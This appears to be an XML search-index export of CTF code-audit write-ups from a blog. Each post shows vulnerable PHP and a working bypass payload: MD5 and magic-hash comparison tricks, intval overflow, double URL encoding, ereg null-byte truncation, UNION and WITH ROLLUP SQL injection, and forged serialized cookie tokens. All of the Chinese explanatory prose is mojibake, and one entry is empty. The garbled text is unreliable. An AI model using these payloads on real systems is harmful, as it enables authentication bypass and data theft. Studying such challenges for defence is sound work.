isset($_GET[&apos;password&apos;])) { if ($_GET[&apos;username&apos;] == $_GET[&apos;password&apos;]) print &apos;Your password can not be your username.&apos;; else if (md5($_GET[&apos;username&apos;]) === md5($_GET[&apos;password&apos;])) die(&apos;Flag: &apos;.$flag); else print &apos;Invalid password&apos;; } ?&gt; ç”±äºmd5è§£æä¸äº†æ•°ç»„ï¼Œè¿”å›ç©ºã€‚ payload:?username[]=1&amp;password[]=2]]></content>
      <categories>
        <category>ä»£ç å®¡è®¡ï¼ˆåŸºç¡€ç¯‡ï¼‰</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[MD5åŠ å¯†ç›¸ç­‰ç»•è¿‡å’Œintvalå‡½æ•°å››èˆäº”å…¥]]></title>
    <url>%2F2019%2F05%2F01%2FMD5%E5%8A%A0%E5%AF%86%E7%9B%B8%E7%AD%89%E7%BB%95%E8%BF%87%E5%92%8Cintval%E5%87%BD%E6%95%B0%E5%9B%9B%E8%88%8D%E4%BA%94%E5%85%A5%2F</url>
    <content type="text"><![CDATA[ä¸€ã€MD5åŠ å¯†ç›¸ç­‰ç»•è¿‡&lt;?php $md51 = md5(&apos;QNKCDZO&apos;); $a = @$_GET[&apos;a&apos;]; $md52 = @md5($a); if(isset($a)){ if ($a != &apos;QNKCDZO&apos; &amp;&amp; $md51 == $md52) { echo &quot;nctf{*****************}&quot;; } else { echo &quot;false!!!&quot;; }} else{echo &quot;please input a&quot;;} ?&gt; å°†QNKCDZOè¿›è¡Œmd5åŠ å¯†åï¼Œå‘ç°ä¸º0eå¼€å¤´ï¼Œæ‰€ä»¥æ­¤å¤„è€ƒè™‘MD5ç¢°æ’ï¼Œå°±æ˜¯ç»è¿‡md5åŠ å¯†åä»¥0eå¼€å¤´çš„åœ¨è¿›è¡Œâ€˜==â€™è¿ç®—æ—¶ï¼Œphpä¼šè®¤ä¸ºä»–ä»¬éƒ½ä¸º0ã€‚payloadä¸ºhttp://127.0.0.1/myphp/test.php?a=s1885207154a äºŒã€intvalå‡½æ•°å››èˆäº”å…¥&lt;?php if($_GET[id]) { mysql_connect(SAE_MYSQL_HOST_M . &apos;:&apos; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $id = intval($_GET[id]); $query = @mysql_fetch_array(mysql_query(&quot;select content from ctf2 where id=&apos;$id&apos;&quot;)); if ($_GET[id]==1024) { echo &quot;&lt;p&gt;no! try again&lt;/p&gt;&quot;; } else{ echo($query[content]); } } ?&gt; payloadï¼šï¼Ÿid=1024.2intvalå‡½æ•°å››èˆäº”å…¥ï¼Œå–å€¼ä¸º1024ï¼Œä½†ifè¯­å¥ä¸­å·²æˆåŠŸç»•è¿‡1024çš„é™åˆ¶,è¾“å‡ºflag]]></content>
      <categories>
        <category>ä»£ç å®¡è®¡ï¼ˆåŸºç¡€ç¯‡ï¼‰</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[å¯†ç MD5æ¯”è¾ƒç»•è¿‡å’ŒurldecodeäºŒæ¬¡ç»•è¿‡]]></title>
    <url>%2F2019%2F05%2F01%2F%E5%AF%86%E7%A0%81MD5%E6%AF%94%E8%BE%83%E7%BB%95%E8%BF%87%E5%92%8Curldecode%E4%BA%8C%E6%AC%A1%E7%BB%95%E8%BF%87%2F</url>
    <content type="text"><![CDATA[ä¸€ã€å¯†ç MD5æ¯”è¾ƒç»•è¿‡â€‹ &lt;?php //é…ç½®æ•°æ®åº“ if($_POST[user] &amp;&amp; $_POST[pass]) { $conn = mysql_connect(&quot;********, &quot;*****&quot;, &quot;********&quot;); mysql_select_db(&quot;phpformysql&quot;) or die(&quot;Could not select database&quot;); if ($conn-&gt;connect_error) { die(&quot;Connection failed: &quot; . mysql_error($conn)); } //èµ‹å€¼ $user = $_POST[user]; $pass = md5($_POST[pass]); //sqlè¯­å¥ // select pw from php where user=&apos;&apos; union select &apos;e10adc3949ba59abbe56e057f20f883e&apos; # // ?user=&apos; union select &apos;e10adc3949ba59abbe56e057f20f883e&apos; #&amp;pass=123456 $sql = &quot;select pw from php where user=&apos;$user&apos;&quot;; $query = mysql_query($sql); if (!$query) { printf(&quot;Error: %s\n&quot;, mysql_error($conn)); exit(); } $row = mysql_fetch_array($query, MYSQL_ASSOC); //echo $row[&quot;pw&quot;]; if (($row[pw]) &amp;&amp; (!strcasecmp($pass, $row[pw]))) { //å¦‚æœ str1 å°äº str2 è¿”å› &lt; 0ï¼› å¦‚æœ str1 å¤§äº str2 è¿”å› &gt; 0ï¼›å¦‚æœä¸¤è€…ç›¸ç­‰ï¼Œè¿”å› 0ã€‚ â€‹ echo â€œLogged in! Key:** â€œ; } else { echo(â€œLog in failure!â€œ); } } ?&gt; åˆ†æè¿™å¥sqlè¯­å¥å¯ä»¥çŸ¥é“ï¼Œæˆ‘ä»¬ä¸èƒ½ç›´æ¥æ³¨é‡Šæ‰å¯†ç  $sql = &quot;select pw from php where user=&apos;$user&apos;&quot;; ç»§ç»­åˆ†ææºç æˆ‘ä»¬å¯ä»¥å‘ç°åªè¦è®©row[pw]çš„å€¼ä¸passç»è¿‡md5ä¹‹åçš„å€¼ç›¸ç­‰å³å¯,ç”¨union selectæ¥è¿”å›ä¸€ä¸ªå·²çŸ¥æ˜æ–‡çš„md5payload= &apos; union select &apos;e10adc3949ba59abbe56e057f20f883e&apos; #&amp;pass=123456` äºŒã€urldecodeäºŒæ¬¡ç»•è¿‡&lt;?php if(eregi(&quot;hackerDJ&quot;,$_GET[id])) { echo(&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;); exit(); } $_GET[id] = urldecode($_GET[id]); if($_GET[id] == &quot;hackerDJ&quot;) { echo &quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;; echo &quot;&lt;p&gt;flag: *****************} &lt;/p&gt;&quot;; } ?&gt; å®¡è®¡æºç  eregi()å‡½æ•° å­—ç¬¦ä¸²æ¯”å¯¹è§£æï¼Œä¸å¤§å°å†™æ— å…³ã€‚è¯­æ³•: eregi(string pattern, string string, array [regs]);è¿”å›å€¼: æ•´æ•°/æ•°ç»„ç‰¹ç‚¹ï¼šPHPå‡½æ•°eregi()ä¸å¤§å°å†™æ— å…³ï¼Œç±»ä¼¼å‡½æ•°ereg() åˆ™åŒºåˆ†å¤§å°å†™ä¾‹ï¼šif (eregi(â€œCâ€,â€abcdefâ€) //true è¦æƒ³å¾—å‡ºflagæˆ‘ä»¬å³è¦æ±‚idä¸èƒ½ç­‰äºhackerDJ,åˆè¦è¦æ±‚idçš„urldecodeè§£ç ç­‰äºidå› æ­¤æˆ‘ä»¬éœ€è¦è¿›è¡Œä¸¤æ¬¡ç¼–ç : h â€“&gt; %68 â€“&gt; %2568 æ„é€ url: index.php?id=%2568ackerDJ æäº¤å³å¯è·å¾—flag:]]></content>
      <categories>
        <category>ä»£ç å®¡è®¡ï¼ˆåŸºç¡€ç¯‡ï¼‰</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[shal()å‡½æ•°ç»•è¿‡å’ŒsessionéªŒè¯ç»•è¿‡]]></title>
    <url>%2F2019%2F05%2F01%2Fshal-%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87%E5%92%8Csession%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%2F</url>
    <content type="text"></content>
  </entry>
  <entry>
    <title><![CDATA[eregæ­£åˆ™æˆªæ–­]]></title>
    <url>%2F2019%2F05%2F01%2Fereg%E6%AD%A3%E5%88%99%E6%88%AA%E6%96%AD%2F</url>
    <content type="text"><![CDATA[&lt;?php $flag = &quot;flag&quot;; if (isset ($_GET[&apos;password&apos;])) { if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&apos;password&apos;]) === FALSE) { echo &apos;&lt;p&gt;You password must be alphanumeric&lt;/p&gt;&apos;; } else if (strlen($_GET[&apos;password&apos;]) &lt; 8 &amp;&amp; $_GET[&apos;password&apos;] &gt; 9999999) { if (strpos ($_GET[&apos;password&apos;], &apos;*-*&apos;) !== FALSE) //strpos â€” æŸ¥æ‰¾å­—ç¬¦ä¸²é¦–æ¬¡å‡ºç°çš„ä½ç½® { die(&apos;Flag: &apos; . $flag); } else { echo(&apos;&lt;p&gt;*-* have not been found&lt;/p&gt;&apos;); } } else { echo &apos;&lt;p&gt;Invalid password&lt;/p&gt;&apos;; } } ?&gt; å®¡è®¡ä¸Šé¢ä»£ç å¯ä»¥å‘ç°è¦æƒ³çš„åˆ°flagå¿…é¡»æ»¡è¶³ä¸€ä¸‹3ä¸ªæ¡ä»¶1ã€å¿…é¡»æ˜¯æ•°å­—ã€å­—æ¯ç»„æˆçš„å¯†ç 2ã€å¯†ç çš„é•¿åº¦å°äº8ï¼Œå´å¿…é¡»è¦å¤§äº99999993ã€å¯†ç å¿…é¡»åŒ…å«â€” å¯¹äºç¬¬äºŒä¸ªæ¡ä»¶ï¼Œä½¿ç”¨ç§‘å­¦è®¡æ•°æ³•ç»•è¿‡å¯¹äºç¬¬ä¸‰ä¸ªæ¡ä»¶ï¼Œç”±äºereg()å‡½æ•°å­˜åœ¨NULLæˆªæ–­æ¼æ´ï¼Œæ‰€ä»¥å¯ä»¥ç”¨%00ï¼ˆç©ºå­—ç¬¦ï¼‰æ¥æˆªæ–­æ­£åˆ™åŒ¹é…ã€‚é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ç»•è¿‡ç¬¬3ä¸ªæ¡ä»¶äº†é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥æ„é€ å‡ºpayloadä¸º1e8%00*â€”*]]></content>
      <categories>
        <category>ä»£ç å®¡è®¡ï¼ˆåŸºç¡€ç¯‡ï¼‰</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[SQLæ³¨å…¥_WITH ROLLUPç»•è¿‡]]></title>
    <url>%2F2019%2F05%2F01%2FSQL%E6%B3%A8%E5%85%A5-WITH-ROLLUP%E7%BB%95%E8%BF%87%2F</url>
    <content type="text"><![CDATA[é¢˜ç›®åœ°å€http://ctf5.shiyanbar.com/web/pcat/index.php &lt;?php error_reporting(0); if (!isset($_POST[&apos;uname&apos;]) || !isset($_POST[&apos;pwd&apos;])) { echo &apos;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&apos;.&quot;&lt;br/&gt;&quot;; echo &apos;&lt;input name=&quot;uname&quot; type=&quot;text&quot;/&gt;&apos;.&quot;&lt;br/&gt;&quot;; echo &apos;&lt;input name=&quot;pwd&quot; type=&quot;text&quot;/&gt;&apos;.&quot;&lt;br/&gt;&quot;; echo &apos;&lt;input type=&quot;submit&quot; /&gt;&apos;.&quot;&lt;br/&gt;&quot;; echo &apos;&lt;/form&gt;&apos;.&quot;&lt;br/&gt;&quot;; echo &apos;&lt;!--source: source.txt--&gt;&apos;.&quot;&lt;br/&gt;&quot;; die; } function AttackFilter($StrKey,$StrValue,$ArrReq){ if (is_array($StrValue)){ //æ£€æµ‹å˜é‡æ˜¯å¦æ˜¯æ•°ç»„ $StrValue=implode($StrValue); //è¿”å›ç”±æ•°ç»„å…ƒç´ ç»„åˆæˆçš„å­—ç¬¦ä¸² } if (preg_match(&quot;/&quot;.$ArrReq.&quot;/is&quot;,$StrValue)==1){ //åŒ¹é…æˆåŠŸä¸€æ¬¡åå°±ä¼šåœæ­¢åŒ¹é… print &quot;æ°´å¯è½½èˆŸï¼Œäº¦å¯èµ›è‰‡ï¼&quot;; exit(); } } $filter = &quot;and|select|from|where|union|join|sleep|benchmark|,|\(|\)&quot;; foreach($_POST as $key=&gt;$value){ //éå†æ•°ç»„ AttackFilter($key,$value,$filter); } $con = mysql_connect(&quot;XXXXXX&quot;,&quot;XXXXXX&quot;,&quot;XXXXXX&quot;); if (!$con){ die(&apos;Could not connect: &apos; . mysql_error()); } $db=&quot;XXXXXX&quot;; mysql_select_db($db, $con); //è®¾ç½®æ´»åŠ¨çš„ MySQL æ•°æ®åº“ $sql=&quot;SELECT * FROM interest WHERE uname = &apos;{$_POST[&apos;uname&apos;]}&apos;&quot;; $query = mysql_query($sql); //æ‰§è¡Œä¸€æ¡ MySQL æŸ¥è¯¢ if (mysql_num_rows($query) == 1) { //è¿”å›ç»“æœé›†ä¸­è¡Œçš„æ•°ç›® $key = mysql_fetch_array($query); //è¿”å›æ ¹æ®ä»ç»“æœé›†å–å¾—çš„è¡Œç”Ÿæˆçš„æ•°ç»„ï¼Œå¦‚æœæ²¡æœ‰æ›´å¤šè¡Œåˆ™è¿”å› false if($key[&apos;pwd&apos;] == $_POST[&apos;pwd&apos;]) { print &quot;CTF{XXXXXX}&quot;; }else{ print &quot;äº¦å¯èµ›è‰‡ï¼&quot;; } }else{ print &quot;ä¸€é¢—èµ›è‰‡ï¼&quot;; } mysql_close($con); ?&gt; å®¡è®¡ä»£ç å¯»æ‰¾æœ‰ç”¨éƒ¨åˆ† if (mysql_num_rows($query) == 1) { //è¿”å›ç»“æœé›†ä¸­è¡Œçš„æ•°ç›® $key = mysql_fetch_array($query); //è¿”å›æ ¹æ®ä»ç»“æœé›†å–å¾—çš„è¡Œç”Ÿæˆçš„æ•°ç»„ï¼Œå¦‚æœæ²¡æœ‰æ›´å¤šè¡Œåˆ™è¿”å› false if($key[&apos;pwd&apos;] == $_POST[&apos;pwd&apos;]) { print &quot;CTF{XXXXXX}&quot;; æ³¨å…¥æˆåŠŸè¦æ»¡è¶³2ä¸ªæ¡ä»¶ï¼š mysql_num_rows($query) == 1 å³æŸ¥è¯¢è¿”å›çš„ç»“æœè¡Œæ•°ä¸º1 $key[â€˜pwdâ€™] == $_POST[â€˜pwdâ€™] å³æŸ¥è¯¢è¿”å›çš„ç»“æœä¸POSTå‘é€çš„pwdå€¼ç›¸åŒ ä»æºä»£ç å¾—å‡ºï¼Œæ³¨å…¥ç‚¹åœ¨unameè¿™ä¸ªä½ç½®ä¸Šï¼Œ$filteræ²¡æœ‰è¿‡æ»¤æ‰ or $sql=â€SELECT * FROM interest WHERE uname = â€˜{$_POST[â€˜unameâ€™]}â€™â€; $filter = &quot;and|select|from|where|union|join|sleep|benchmark|,|\(|\)&quot;; å¯¹andç­‰ç­‰è¿›è¡Œè¿‡æ»¤ã€‚ é‚£ä¹ˆå¦‚æœåªè®©å…¶å¯¹è¿”å›ç»“æœåªå–æœ€åä¸€è¡Œå‘¢ï¼Œè‡ªç„¶è€Œç„¶çš„æƒ³åˆ°limit a,bè¿™æ ·çš„å‘½ä»¤ã€‚ä½†æ˜¯â€œï¼Œâ€è¢«è¿‡æ»¤äº†ã€‚é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ limit a offset b SQLæŸ¥è¯¢è¯­å¥ä¸­çš„ limit ä¸ offset çš„åŒºåˆ«ï¼š limit y åˆ†å¥è¡¨ç¤º: è¯»å– y æ¡æ•°æ® //limit 10,å°±æ˜¯ ä»ç¬¬0ä¸ªå¼€å§‹ï¼Œè·å–10æ¡æ•°æ® limit x, y åˆ†å¥è¡¨ç¤º: è·³è¿‡ x æ¡æ•°æ®ï¼Œè¯»å– y æ¡æ•°æ® //limit 1,2 å°±æ˜¯è¯»å–2-3æ¡æ•°æ® limit y offset x åˆ†å¥è¡¨ç¤º: è·³è¿‡ x æ¡æ•°æ®ï¼Œè¯»å– y æ¡æ•°æ® //limit 2 offest 1 å°±æ˜¯è¯»å–2-3æ¡æ•°æ® æ³¨æ„åˆå§‹åç§»é‡ä¸º0 payloadå¦‚ä¸‹ uname=&apos; || 1 group by pwd with rollup limit 1 offset 2 # // uname=â€™ or 1 group by pwd with rollup limit 1 offset 2# â€˜æ˜¯å¯¹å‰é¢çš„â€™çš„å°é—­ï¼Œç„¶ååˆ©ç”¨||1å°†è¿™ä¸ªæ¡ä»¶å˜æˆtrueï¼Œå³å¯å¾—å‡ºflag, (group byæ˜¯æŠŠå‰é¢çš„æŸ¥è¯¢çš„å†…å®¹æŒ‰ç…§pwdæ¥åˆ†ç»„ã€‚with rollupæ˜¯ç»Ÿè®¡ä¿¡æ¯çš„è¿™é‡Œå°±æ˜¯é‡ç‚¹äº†ï¼Œå› ä¸ºä»£ç ä¸­$key[â€˜pwdâ€™] == $_POST[â€˜pwdâ€™]ç”¨çš„æ˜¯åŒç­‰å·æ˜¯å¼±æ¯”è¾ƒã€‚è€Œwith rollupä¼šåœ¨æŸ¥è¯¢çš„ç»“æœåé¢åŠ ä¸Šä¸€ä¸ªä¸ºç©ºçš„åˆ—,æ‰€ä»¥passwordä¸ºç©ºå’ŒNULLæ˜¯ç›¸ç­‰çš„å°±ç»•è¿‡äº†pwdçš„æ¯”è¾ƒ) è‡³äºä¸ºå•¥offset 2ï¼Œè¿™ä¸ªæ˜¯è¯•å‡ºæ¥çš„ï¼Œå…¶å®æˆ‘ä»¬æ ¹æœ¬ä¸å¯èƒ½çŸ¥é“with rollupä¼šæ€»ç»“å½’çº³å‡ºå¤šå°‘æ¡ä¿¡æ¯ï¼Œoffset 2èƒ½è¿‡è¯´æ˜æ­£ç¡®çš„pwdä½äºç¬¬ä¸‰æ¡ä¿¡æ¯ è¿™é‡Œè¦æ³¨æ„ä¸€ç‚¹ï¼Œå½“ä½¿ç”¨rollupçš„æ—¶å€™å°±ä¸èƒ½ä½¿ç”¨order byè¿›è¡Œæ’åºï¼Œæ¢å¥è¯è¯´ rollupå’Œorder byæ˜¯ç›¸äº’æ’æ–¥çš„ã€‚]]></content>
      <categories>
        <category>ä»£ç å®¡è®¡ï¼ˆåŸºç¡€ç¯‡ï¼‰</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[å¤šé‡åŠ å¯†]]></title>
    <url>%2F2019%2F05%2F01%2FMultiple-Encryption%2F</url>
    <content type="text"><![CDATA[&lt;?php include &apos;common.php&apos;; $requset = array_merge($_GET, $_POST, $_SESSION, $_COOKIE); //æŠŠä¸€ä¸ªæˆ–å¤šä¸ªæ•°ç»„åˆå¹¶ä¸ºä¸€ä¸ªæ•°ç»„ class db { public $where; function __wakeup() { if(!empty($this-&gt;where)) { $this-&gt;select($this-&gt;where); } } function select($where) { $sql = mysql_query(&apos;select * from user where &apos;.$where); //å‡½æ•°æ‰§è¡Œä¸€æ¡ MySQL æŸ¥è¯¢ã€‚ return @mysql_fetch_array($sql); //ä»ç»“æœé›†ä¸­å–å¾—ä¸€è¡Œä½œä¸ºå…³è”æ•°ç»„ï¼Œæˆ–æ•°å­—æ•°ç»„ï¼Œæˆ–äºŒè€…å…¼æœ‰è¿”å›æ ¹æ®ä»ç»“æœé›†å–å¾—çš„è¡Œç”Ÿæˆçš„æ•°ç»„ï¼Œå¦‚æœæ²¡æœ‰æ›´å¤šè¡Œåˆ™è¿”å› false } } if(isset($requset[&apos;token&apos;])) //æµ‹è¯•å˜é‡æ˜¯å¦å·²ç»é…ç½®ã€‚è‹¥å˜é‡å·²å­˜åœ¨åˆ™è¿”å› true å€¼ã€‚å…¶å®ƒæƒ…å½¢è¿”å› false å€¼ã€‚ { $login = unserialize(gzuncompress(base64_decode($requset[&apos;token&apos;]))); //gzuncompress:è¿›è¡Œå­—ç¬¦ä¸²å‹ç¼© //unserialize: å°†å·²åºåˆ—åŒ–çš„å­—ç¬¦ä¸²è¿˜åŸå› PHP çš„å€¼ $db = new db(); $row = $db-&gt;select(&apos;user=\&apos;&apos;.mysql_real_escape_string($login[&apos;user&apos;]).&apos;\&apos;&apos;); //mysql_real_escape_string() å‡½æ•°è½¬ä¹‰ SQL è¯­å¥ä¸­ä½¿ç”¨çš„å­—ç¬¦ä¸²ä¸­çš„ç‰¹æ®Šå­—ç¬¦ã€‚ if($login[&apos;user&apos;] === &apos;ichunqiu&apos;) { echo $flag; }else if($row[&apos;pass&apos;] !== $login[&apos;pass&apos;]){ echo &apos;unserialize injection!!&apos;; }else{ echo &quot;(â•¯â€µâ–¡â€²)â•¯ï¸µâ”´â”€â”´ &quot;; } }else{ header(&apos;Location: index.php?error=1&apos;); } ?&gt; é˜…è¯»ä»£ç å¯»æ‰¾æœ‰ç”¨çš„ä»£ç æ®µ if($login[&apos;user&apos;] === &apos;ichunqiu&apos;) { echo $flag; å‘ç°login[user]è¦æ±‚=ichunqiuï¼Œæ‰èƒ½è¾“å‡ºflagã€‚ä½†æ˜¯ $login = unserialize(gzuncompress(base64_decode($requset[&apos;token&apos;]))); //å…ˆå¯¹tokenè¿›è¡Œbase-64è§£å¯†ï¼Œç„¶åå†è¿›è¡Œè§£å‹gzuncompresså­—ç¬¦ä¸²ï¼Œæœ€ååœ¨ååºåˆ—åŒ– é‚£ä¹ˆæˆ‘ä»¬å°±è¦åœ¨cookieä¸­ç»™tokenä¸€ä¸ªå‚æ•°ï¼Œå…ˆæ˜¯åˆ›å»ºä¸€ä¸ªæ•°ç»„å¹¶ç»™å…¶ä¸­çš„useré”®èµ‹å€¼ä¸ºichunqiuå…ˆåºåˆ—åŒ–ï¼Œç„¶åå‹ç¼©å­—ç¬¦ä¸²ï¼ˆgzcompressæ–¹æ³•ï¼‰ï¼Œæœ€åå†base-64åŠ å¯†å†™æˆphpä»£ç å¦‚ä¸‹ï¼ˆï¼‰ &lt;?php $a = array(&apos;user&apos;=&gt;&apos;ichunqiu&apos;); $b = base64_encode(gzcompress(serialize($a))); echo $b ?&gt; å¯ä»¥è¾“å‡º ç„¶åæŠ“åŒ…ï¼Œåœ¨cookieä¸­æ·»åŠ  takenå‚æ•°ï¼Œå…¶å€¼ä¸ºæˆªå›¾ä¸­çš„å†…å®¹å³å¯å¾—å‡ºflag]]></content>
      <categories>
        <category>ä»£ç å®¡è®¡ï¼ˆåŸºç¡€ç¯‡ï¼‰</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[ç»•è¿‡è¿‡æ»¤çš„ç©ºç™½å­—ç¬¦]]></title>
    <url>%2F2019%2F04%2F08%2FBlank-to-bypass%2F</url>
    <content type="text"><![CDATA[&lt;?php $info = &quot;&quot;; $req = []; $flag=&quot;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;; ini_set(&quot;display_error&quot;, false); //ä¸ºä¸€ä¸ªé…ç½®é€‰é¡¹è®¾ç½®å€¼ error_reporting(0); //å…³é—­æ‰€æœ‰PHPé”™è¯¯æŠ¥å‘Š if(!isset($_GET[&apos;number&apos;])){ header(&quot;hint:26966dc52e85af40f59b4fe73d8c323a.txt&quot;); //HTTPå¤´æ˜¾ç¤ºhint 26966dc52e85af40f59b4fe73d8c323a.txt die(&quot;have a fun!!&quot;); //die â€” ç­‰åŒäº exit() } foreach([$_GET, $_POST] as $global_var) { //foreach è¯­æ³•ç»“æ„æä¾›äº†éå†æ•°ç»„çš„ç®€å•æ–¹å¼ foreach($global_var as $key =&gt; $value) { $value = trim($value); //trim â€” å»é™¤å­—ç¬¦ä¸²é¦–å°¾å¤„çš„ç©ºç™½å­—ç¬¦ï¼ˆæˆ–è€…å…¶ä»–å­—ç¬¦ï¼‰ is_string($value) &amp;&amp; $req[$key] = addslashes($value); // is_string â€” æ£€æµ‹å˜é‡æ˜¯å¦æ˜¯å­—ç¬¦ä¸²ï¼Œaddslashes â€” ä½¿ç”¨åæ–œçº¿å¼•ç”¨å­—ç¬¦ä¸² } } â€‹ function is_palindrome_number($number) { $number = strval($number); //strval â€” è·å–å˜é‡çš„å­—ç¬¦ä¸²å€¼ $i = 0; $j = strlen($number) - 1; //strlen â€” è·å–å­—ç¬¦ä¸²é•¿åº¦ while($i &lt; $j) { if($number[$i] !== $number[$j]) { return false; } $i++; $jâ€“; } return true; } â€‹ if(is_numeric($_REQUEST[â€˜numberâ€™])) //is_numeric â€” æ£€æµ‹å˜é‡æ˜¯å¦ä¸ºæ•°å­—æˆ–æ•°å­—å­—ç¬¦ä¸² { $info=&quot;sorry, you cann&apos;t input a number!&quot;; } elseif($req[&apos;number&apos;]!=strval(intval($req[&apos;number&apos;]))) //intval â€” è·å–å˜é‡çš„æ•´æ•°å€¼ { $info = &quot;number must be equal to it&apos;s integer!! &quot;; } else { $value1 = intval($req[&quot;number&quot;]); $value2 = intval(strrev($req[&quot;number&quot;])); if($value1!=$value2){ $info=&quot;no, this is not a palindrome number!&quot;; } else { if(is_palindrome_number($req[&quot;number&quot;])){ $info = &quot;nice! {$value1} is a palindrome number!&quot;; } else { $info=$flag; } } } echo $info; å®¡è®¡ä»£ç å¯ä»¥å‘ç°ï¼Œnumberå¿…é¡»ç¬¦åˆä¸‹é¢3ä¸ªæ¡ä»¶æ‰å¯ä»¥è¾“å‡ºflag1.ä¸ä¸ºç©ºï¼Œä¸”ä¸èƒ½æ˜¯ä¸€ä¸ªæ•°å€¼å‹æ•°å­—ï¼ŒåŒ…æ‹¬å°æ•°ã€‚(ç”±is_numericå‡½æ•°åˆ¤æ–­)2.ä¸èƒ½æ˜¯ä¸€ä¸ªå›æ–‡æ•°ã€‚ï¼ˆis_palindrome_numberåˆ¤æ–­ï¼‰3.è¯¥æ•°çš„åè½¬çš„æ•´æ•°å€¼åº”è¯¥å’Œå®ƒæœ¬èº«çš„æ•´æ•°å€¼ç›¸ç­‰;å³ intval($req[&quot;number&quot;])=intval(strrev($req[&quot;number&quot;])) ä½†æ˜¯2å’Œ3åˆå†²çªï¼Œè¿™è¯¥æ€ä¹ˆåŠ æ–¹æ³•ä¸€æˆ‘ä»¬æ„é€ çš„payloadä¸ºï¼š ?number=%002147483647 è§£é‡Šä¸‹ä¸ºä»€ä¹ˆå¯ä»¥è¿™ä¹ˆæ„é€ ï¼›1ã€is_numericå‡½æ•°å¯¹äºç©ºå­—ç¬¦%00åˆ¤æ–­ä¸ºéæ•°å€¼ï¼Œç»•è¿‡ç¬¬ä¸€ä¸ªæ¡ä»¶ã€‚ å‡½æ•°åˆ¤æ–­ä¸ºéæ•°å€¼ï¼Œä½†åˆä¸å½±å“å®ƒå€¼çš„æ„é€ ï¼Œç†æ‰€å½“ç„¶æƒ³åˆ°ç©ºæ ¼å­—ç¬¦%20å’Œç©ºå­—ç¬¦%00ã€‚ 2ã€2147483647ä¸æ˜¯ä¸€ä¸ªå›æ–‡æ•°ç»•è¿‡ç¬¬äºŒä¸ªæ¡ä»¶ã€‚ 3ã€è¿™é‡Œåˆ©ç”¨äº†intvalå‡½æ•°çš„æº¢å‡ºé—®é¢˜ã€‚ Intvalæœ€å¤§çš„å€¼å–å†³äºæ“ä½œç³»ç»Ÿã€‚ 32 ä½ç³»ç»Ÿæœ€å¤§å¸¦ç¬¦å·çš„ integer èŒƒå›´æ˜¯ -2147483648 åˆ° 2147483647ã€‚ä¸¾ä¾‹ï¼Œåœ¨è¿™æ ·çš„ç³»ç»Ÿä¸Šï¼Œ intval(â€˜1000000000000â€™) ä¼šè¿”å› 2147483647ã€‚64 ä½ç³»ç»Ÿä¸Šï¼Œæœ€å¤§å¸¦ç¬¦å·çš„ integer å€¼æ˜¯ 9223372036854775807ã€‚ è‡³äºæœåŠ¡å™¨æ˜¯ä»€ä¹ˆç³»ç»Ÿçš„å¯ä»¥ç”¨burpæŠ“åŒ…åˆ†æå‡ºæ¥ä¸º32ä½ $value1 = intval($req[&quot;number&quot;]); $value2 = intval(strrev($req[&quot;number&quot;])); æˆ‘ä»¬æ„é€ çš„2147483647ç»è¿‡strrevåè½¬å‡½æ•°åä¸º7463847412ï¼Œåˆç»è¿‡intvalå‡½æ•°å€¼åˆå˜ä¸º2147483647ã€‚æ•…æ»¡è¶³æ¡ä»¶3ï¼Œå¯ä»¥è¾“å‡ºflag æ–¹æ³•äºŒå› ä¸ºè¦æ±‚ä¸èƒ½ä¸ºå›æ–‡æ•°ï¼Œä½†åˆè¦æ»¡è¶³intval($req[&quot;number&quot;])=intval(strrev($req[&quot;number&quot;]))ï¼Œæ‰€ä»¥æˆ‘ä»¬é‡‡ç”¨ç§‘å­¦è®¡æ•°æ³•æ„é€ payloadä¸ºnumber=0e-0%00ï¼Œè¿™æ ·çš„è¯æˆ‘ä»¬å°±å¯ä»¥ç»•è¿‡ã€‚ xeyåœ¨phpä¸­å°±æ˜¯x*10çš„yæ¬¡æ–¹ æ³¨æ„is_numericå‡½æ•°å¯¹äºç©ºå­—ç¬¦%00ï¼Œæ— è®ºæ˜¯%00æ”¾åœ¨å‰åéƒ½å¯ä»¥åˆ¤æ–­ä¸ºéæ•°å€¼ï¼Œè€Œ%20ç©ºæ ¼å­—ç¬¦åªèƒ½æ”¾åœ¨æ•°å€¼å æ–¹æ³•ä¸‰is_numericå‡½æ•°åœ¨å¼€å§‹åˆ¤æ–­å‰ï¼Œä¼šå…ˆè·³è¿‡æ‰€æœ‰ç©ºç™½å­—ç¬¦å¯æ˜¯é¢˜ç›®è·å–$req[â€˜numberâ€™]çš„æ—¶å€™æ˜æ˜ä½¿ç”¨trimè¿‡æ»¤äº†ç©ºç™½å­—ç¬¦è¿™æ—¶å€™æˆ‘ä»¬å¯ä»¥å¼•å…¥\fï¼ˆä¹Ÿå°±æ˜¯%0cï¼‰åœ¨æ•°å­—å‰é¢ï¼Œæ¥ç»•è¿‡æœ€åé‚£ä¸ªis_palindrome_numberå‡½æ•°ï¼Œè€Œå¯¹äºå‰é¢çš„æ•°å­—åˆ¤æ–­ï¼Œå› ä¸ºintvalå’Œis_numericéƒ½ä¼šå¿½ç•¥è¿™ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥ä¸ä¼šå½±å“ã€‚æ‰€ä»¥æˆ‘ä»¬æ„é€ payload=URL?%00%0c191å³å¯ç»•è¿‡ä¸Šé¢çš„æ¡ä»¶è·å¾—flag]]></content>
      <categories>
        <category>ä»£ç å®¡è®¡ï¼ˆåŸºç¡€ç¯‡ï¼‰</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[upload-labs 1-17]]></title>
